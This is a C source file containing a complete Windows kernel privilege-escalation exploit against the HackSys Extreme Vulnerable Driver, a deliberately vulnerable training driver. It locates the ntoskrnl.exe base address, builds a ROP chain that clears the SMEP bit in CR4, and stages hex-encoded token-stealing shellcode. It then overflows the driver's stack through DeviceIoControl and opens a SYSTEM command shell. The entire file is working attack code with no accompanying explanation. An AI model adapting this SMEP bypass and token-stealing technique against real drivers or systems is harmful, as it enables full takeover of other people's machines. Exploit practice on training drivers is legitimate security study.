#include <stdio.h>
#include <Windows.h>
#include <psapi.h>

#define IO_CODE 0x222003 // Set IO_CODE for the Stack Overflow Vulnerability
#define ARRAY_SIZE 1024 // Set ARRAY_SIZE for driver enumeration

typedef struct _GADGETS {
	PUCHAR gadget1;
	PUCHAR gadget2;
	PUCHAR gadget3;
} GADGETS, * PGADGETS;

PUCHAR GetKernel() {
	char* krnl = "ntoskrnl.exe";
	LPVOID lpImageBase[ARRAY_SIZE];
	DWORD lpcbNeeded;
	int drivers, i;
	CHAR lpFileName[ARRAY_SIZE];
	PUCHAR krnl_base = NULL;

	printf("[+] Calling EnumDeviceDrivers() to find base address of ntoskrnl.exe..\n");
	EnumDeviceDrivers(lpImageBase, sizeof(lpImageBase), &lpcbNeeded);
	drivers = lpcbNeeded / sizeof(lpImageBase[0]);

	for (i = 0; i < drivers; i++) {
		GetDeviceDriverBaseNameA(lpImageBase[i], lpFileName, sizeof(lpFileName) / sizeof(char));
		if (strcmp(krnl, lpFileName) == 0) {
			printf("[+] Found %s..\n", lpFileName);
			krnl_base = lpImageBase[i];
			break;
		}
	}
	return krnl_base;
}

int main(int argc, char* argv[]) {
	char shellcode[] = "\x65\x48\x8B\x04\x25\x88\x01\x00\x00\x48\x8B\x80\xB8\x00\x00\x00\x48\x89\xC3\x48\x8B\x9B\xE8\x02\x00\x00\x48\x81\xEB\xE8\x02\x00\x00\x48\x8B\x8B\xE0\x02\x00\x00\x48\x83\xF9\x04\x75\xE5\x48\x8B\x8B\x58\x03\x00\x00\x80\xE1\xF0\x48\x89\x88\x58\x03\x00\x00\x48\x83\xC4\x40\xC3";

	PUCHAR pKrnl_base = GetKernel();
	GADGETS dSMEP;

	printf("[+] Base address of ntoskrnl.exe is: 0x%llx\n", pKrnl_base);

	printf("[+] Initiating ROP chain to change SMEP bit value in CR4 to 0..\n");
	dSMEP.gadget1 = pKrnl_base + 0x3544; // POP RCX; RET
	printf("[+] Flipping SMEP bit value in CR4 to 0..\n");
	dSMEP.gadget2 = (PUCHAR)0x506F8; // Value to pop into RCX register - Flipping 20th bit in CR4 register
	printf("[+] Placing new SMEP bit value into CR4 register..\n");
	dSMEP.gadget3 = pKrnl_base + 0x108552; // MOV CR4, ECX; RET
	printf("[+] Success - SMEP disabled!\n");

	printf("[+] Allocating memory region for shellcode..\n");
	LPVOID Alloc = VirtualAlloc(NULL, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	if (!Alloc) {
		printf("[-] Error - Unable to allocate shellcode.\n");
		exit(1);
	}
	printf("[+] Successfully copied tokenstealing shellcode to memory region at: 0x%llx\n", Alloc);

	RtlMoveMemory(Alloc, shellcode, sizeof(shellcode));

	printf("[+] Calling CreateFileA() to obtain a handle to the driver..\n");
	HANDLE vulnDevice = CreateFileA("\\\\.\\HackSysExtremeVulnerableDriver", 0xC0000000, 0, NULL, 0x3, 0, NULL);
	if (vulnDevice == INVALID_HANDLE_VALUE) {
		printf("[-] Error - Unable to obtain a handle to the driver.\n");
		exit(1);
	}
	printf("[+] Successfully obtained a handle to the driver..\n");

	DWORD bytesRetn;
	char expl[2088];
	const size_t offset = 2088;

	memset(expl, 'A', offset);
	memcpy(&expl[2056], &dSMEP, 0x18);
	memcpy(&expl[2080], &Alloc, 0x8);

	printf("[+] Starting interaction with the driver..\n");
	DeviceIoControl(vulnDevice, IO_CODE, expl, sizeof(expl), NULL, 0, &bytesRetn, NULL);

	printf("[+] Welcome, NT AUTHORITY\\SYSTEM!\n\n");

	CloseHandle(vulnDevice);
	system("cmd.exe");

	return 0;
}
